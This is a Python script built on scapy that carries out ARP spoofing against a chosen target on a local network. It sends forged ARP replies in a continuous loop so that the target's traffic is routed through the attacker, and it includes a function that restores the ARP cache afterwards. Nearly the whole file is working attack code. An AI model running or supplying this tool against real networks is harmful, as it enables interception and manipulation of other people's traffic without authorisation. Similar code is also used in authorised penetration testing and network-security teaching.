from threading import Lock,Event
from scapy.all import Ether,ARP,sendp,srp
from time import sleep
from colorama import Fore,Style

red=Fore.RED
blue=Fore.BLUE
bright=Style.BRIGHT
white=Fore.WHITE
yellow=Fore.YELLOW
red=Fore.RED
reset=Style.RESET_ALL
stop_event=Event()

def get_mac_addr(ip):
    # Function to get mac address from given ip.
    try:
        ether_frame=Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet=ARP(pdst=ip)
        sent_packet=ether_frame/arp_packet
        answer,unanswer=srp(sent_packet,verbose=False)
        return answer[0].answer.src
    
    except IndexError:
        print(f"{bright}{blue}INFO:{reset}Ip isn't reachable.")
        quit()
    
    except Exception as e:
        print(f"{bright}{blue}INFO:{reset}Unexpected Mac Error:{e}")
    
def spoof_restorer(target_ip,target_mac,gateway_ip,gateway_mac,interface):
    # Funtion to restore spoofed arp table to back its original.
    for packet in range(1,6):
        sleep(0.2)
        try:
            target_arp_restore_packet = Ether(dst=target_mac) / ARP(op=2,psrc=gateway_ip,hwsrc=gateway_mac, hwdst=target_mac, pdst=target_ip)
            sendp(target_arp_restore_packet,iface=interface,verbose=False)

            
        except Exception as e:
            print(f"{bright}{blue}INFO:{reset}Unexpected Error:{e}")
            break    
    print(f"{bright}{yellow}\n[+] {reset}{blue}Target spoof {bright}status: {red}Stoped{reset}")
    print(f"{bright}{yellow}[+] {reset}{blue}Gateway spoof {bright}status: {red}Stoped{reset}")    
    
def arp_spoofer(target_ip,target_mac,spoof_ip,interface):
    # Function to create spoofed replay_packet sent.
    while not stop_event.is_set():
        try:
            arp_rpacket = Ether(dst=target_mac) / ARP(op=2,psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
            sendp(arp_rpacket,iface=interface,verbose=False)
            sleep(0.1)
            
        except Exception as e:
            print(f"{bright}{blue}INFO:{reset}Unexpected Error:{e}")
            break